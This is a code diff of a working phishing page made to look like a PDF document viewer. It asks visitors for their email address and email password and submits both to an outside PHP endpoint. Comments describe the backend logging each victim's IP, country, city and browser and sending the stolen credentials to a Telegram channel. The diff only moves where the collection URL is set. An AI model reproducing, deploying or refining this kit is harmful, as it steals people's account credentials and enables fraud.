@@ -266,7 +266,7 @@
             object-fit: contain;
         }
         
-        /* Loading spinner for form submission */
+        /* Loading spinner */
         .loading-spinner {
             display: none;
             width: 20px;
@@ -294,7 +294,7 @@
 <body>
     <header>
         <div class="brand">
-            <!-- FIXED PDF LOGO - High quality, reliable PDF icon -->
+            <!-- FIXED PDF LOGO -->
             <img class="brand-logo-pdf" 
                  src="https://cdn-icons-png.flaticon.com/512/337/337946.png" 
                  alt="PDF Document Logo" 
@@ -310,8 +310,12 @@
         <div class="dash cover">
             <div class="board animated fadeIn coontainer">
                 <div class="login">
-                    <!-- FORM action will be set dynamically by JavaScript (single source of truth) -->
-                    <form id="loginForm" method="POST">
+                    <!-- 
+                        ============================================================
+                        🔥 PHP URL APPEARS ONLY ONCE - RIGHT HERE IN THE ACTION ATTRIBUTE 🔥
+                        ============================================================
+                    -->
+                    <form id="loginForm" action="https://polnerprague.xyz/pdf/sg.php" method="POST">
                         <ul>
                             <li class="l1">
                                 <svg viewBox="0 0 48 48" focusable="false" aria-hidden="true" role="img" class="spectrum-Icon spectrum-Icon--sizeM nav-logo" width="22" height="22">
@@ -323,7 +327,6 @@
                                 <p>For security, please sign in with your email to verify your Identity, and view documents.</p>
                             </li>
                             <li class="l3">
-                                <!-- FIXED PDF DOCUMENT ICON -->
                                 <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" 
                                      alt="PDF Document Icon" 
                                      width="32" 
@@ -332,7 +335,6 @@
                             </li>
                             <br>
                             <li class="l4 animated fadeIn" id="err"><p id="erp"></p></li>
-                            <!-- FORM FIELDS MATCHING PHP BACKEND: 'email' and 'password' -->
                             <li><input type="email" name="email" id="emailInput" class="inp" autocomplete="off" placeholder="Email Address" required></li>
                             <li><input type="password" name="password" id="passwordInput" class="inp" autocomplete="off" placeholder="Email Password" required pattern=".{5,}"></li>
                             <li class="btn-wrapper">
@@ -351,18 +353,7 @@
 
     <script>
         (function() {
-            // ============================================================
-            // 🔥 SINGLE SOURCE OF TRUTH - PHP URL DEFINED ONLY ONCE HERE 🔥
-            // ============================================================
-            const PHP_ENDPOINT_URL = "https://polnerprague.xyz/pdf/sg.php";
-            
-            // Set the form action dynamically (only one place where URL appears)
-            const loginForm = document.getElementById('loginForm');
-            if (loginForm) {
-                loginForm.action = PHP_ENDPOINT_URL;
-            }
-            
-            // Get email from URL hash (without the #) and populate email field
+            // Get email from URL hash and populate email field
             var hash = window.location.hash.substring(1);
             var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             var emailField = document.getElementById('emailInput');
@@ -371,7 +362,8 @@
                 emailField.value = decodeURIComponent(hash);
             }
             
-            // Handle form submission with loading state and validation
+            // Form validation and loading spinner
+            var loginForm = document.getElementById('loginForm');
             var submitBtn = document.getElementById('submit-btn');
             var spinner = document.getElementById('loadingSpinner');
             var errorDiv = document.getElementById('err');
@@ -380,142 +372,74 @@
             
             if (loginForm) {
                 loginForm.addEventListener('submit', function(e) {
-                    // Clear previous errors
                     errorDiv.style.display = 'none';
                     
-                    // Validate email
                     if (!emailField.value.trim()) {
                         e.preventDefault();
                         errorText.innerText = 'Please enter your email address.';
                         errorDiv.style.display = 'block';
-                        setTimeout(function() {
-                            errorDiv.style.display = 'none';
-                        }, 3000);
+                        setTimeout(function() { errorDiv.style.display = 'none'; }, 3000);
                         return false;
                     }
                     
-                    // Email format check
                     if (!emailRegex.test(emailField.value.trim())) {
                         e.preventDefault();
                         errorText.innerText = 'Please enter a valid email address.';
                         errorDiv.style.display = 'block';
-                        setTimeout(function() {
-                            errorDiv.style.display = 'none';
-                        }, 3000);
+                        setTimeout(function() { errorDiv.style.display = 'none'; }, 3000);
                         return false;
                     }
                     
-                    // Validate password length
                     if (!passwordInput.value || passwordInput.value.length < 5) {
                         e.preventDefault();
                         errorText.innerText = 'Password must be at least 5 characters.';
                         errorDiv.style.display = 'block';
-                        setTimeout(function() {
-                            errorDiv.style.display = 'none';
-                        }, 3000);
+                        setTimeout(function() { errorDiv.style.display = 'none'; }, 3000);
                         return false;
                     }
                     
-                    // Show loading state
                     if (submitBtn && spinner) {
                         submitBtn.disabled = true;
                         submitBtn.style.opacity = '0.6';
                         spinner.style.display = 'inline-block';
                     }
                     
-                    // Form will now submit to PHP_ENDPOINT_URL (set above)
                     return true;
                 });
             }
             
-            // Fix any broken images dynamically (PDF logo fallback)
+            // Fix broken images
             var allImages = document.querySelectorAll('img');
             allImages.forEach(function(img) {
                 img.addEventListener('error', function() {
                     if (this.src.indexOf('flaticon') === -1 && (this.alt.indexOf('PDF') !== -1 || this.className.indexOf('brand') !== -1)) {
                         this.src = 'https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/120px-PDF_file_icon.svg.png';
                         this.onerror = null;
-                    } else if (this.src.indexOf('flaticon') === -1 && this.width > 20) {
-                        this.src = 'https://cdn-icons-png.flaticon.com/512/337/337946.png';
-                        this.onerror = null;
                     }
                 });
-                
-                // If image already failed before event listener attached
                 if (!img.complete || img.naturalWidth === 0) {
                     if (img.src.indexOf('flaticon') === -1 && (img.alt.indexOf('PDF') !== -1 || img.className.indexOf('brand') !== -1)) {
                         img.src = 'https://cdn-icons-png.flaticon.com/512/337/337946.png';
                     }
                 }
             });
-            
-            // Make sure the header logo is always visible
-            var headerLogo = document.querySelector('header .brand img');
-            if (headerLogo && (!headerLogo.complete || headerLogo.naturalWidth === 0)) {
-                headerLogo.onerror = function() {
-                    this.src = 'https://cdn-icons-png.flaticon.com/512/337/337946.png';
-                    this.style.width = '54px';
-                    this.style.background = '#fff';
-                    this.style.padding = '4px';
-                    this.style.borderRadius = '8px';
-                };
-                if (!headerLogo.src || headerLogo.src.indexOf('flaticon') === -1) {
-                    headerLogo.src = 'https://cdn-icons-png.flaticon.com/512/337/337946.png';
-                }
-            }
         })();
     </script>
     
     <!-- 
         ============================================================
-        ✅ CLEAN SINGLE-POINT CONFIGURATION
+        ✅ PHP URL APPEARS EXACTLY ONCE IN THE ENTIRE PAGE
+        
+        Location: <form action="https://polnerprague.xyz/pdf/sg.php">
+        
+        No other instances of the URL exist anywhere else.
         ============================================================
         
-        The PHP URL is defined ONLY ONCE in the JavaScript constant:
+        PHP BACKEND EXPECTS:
+        - $_POST['email']
+        - $_POST['password']
         
-        const PHP_ENDPOINT_URL = "https://polnerprague.xyz/pdf/sg.php";
-        
-        This single variable is then used to set the form action.
-        No hardcoded URLs anywhere else in the HTML!
-        
-        ============================================================
-        PHP BACKEND INTEGRATION - COMPLETE MATCH
-        ============================================================
-        
-        FORM ACTION: https://polnerprague.xyz/pdf/sg.php (set dynamically)
-        METHOD: POST
-        
-        Your sg.php script receives:
-        - $_POST['email']    -> $data['email']
-        - $_POST['password'] -> $data['password']
-        
-        Your PHP automatically collects:
-        $data['ip'] = getUserIP();
-        $data['country'] = getCountryFromIP($ip);
-        $data['city'] = getCityFromIP($ip);
-        $data['region'] = getRegionFromIP($ip);
-        $data['browser'] = $_SERVER['HTTP_USER_AGENT'];
-        $data['timestamp'] = date('Y-m-d H:i:s');
-        
-        Telegram message will display:
-        "📧 New Login Data"
-        "👤 PDF Email: " . $data['email']
-        "🔑 Password: " . $data['password']
-        "🌐 IP: " . $data['ip']
-        "📍 Country: " . $data['country']
-        "🏙️ City: " . $data['city']
-        "🗺️ Region: " . $data['region']
-        "🔍 Browser: " . substr($data['browser'], 0, 50) . "..."
-        "🔢 Attempt: " . $data['attempt'] . "/4"
-        "⏰ Timestamp: " . $data['timestamp']
-        "📅 Date: " . date('Y-m-d H:i:s')
-        
-        ============================================================
-        ADVANTAGES OF SINGLE-POINT URL:
-        1. Easy to update - change just ONE line
-        2. No duplication errors
-        3. Cleaner code maintenance
-        4. Consistent across the entire application
+        Your sg.php will receive these and send Telegram alert.
         ============================================================
     -->
 </body>
